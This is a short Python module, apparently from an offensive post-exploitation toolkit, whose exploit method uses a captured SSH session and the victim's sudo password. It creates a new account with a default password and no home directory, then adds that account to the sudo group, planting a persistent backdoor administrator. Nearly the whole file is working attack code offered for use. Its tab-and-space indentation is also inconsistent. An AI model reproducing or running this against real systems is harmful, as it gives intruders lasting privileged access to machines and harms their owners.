from module import *

class AddUser(Module):

    def __init__(self, target, command, core):
        self.target = target
        self.core = core
	self.name = "AddUser"
	self.command = command
	self.options = {
		"username": Option("username", "bob1234", "name of new user", False),
		"password": Option("password", "password", "password of new user", False),
	}
    
    def exploit(self, command):
	user=self.get_value("username")
	password=self.get_value("password")
	print("Creating user....")

	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S useradd -M -p $(openssl passwd -1 \"" + password + "\") " + user)

	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S usermod -a -G sudo " + user)
	
        print(GOOD + " " + self.name + " module success")
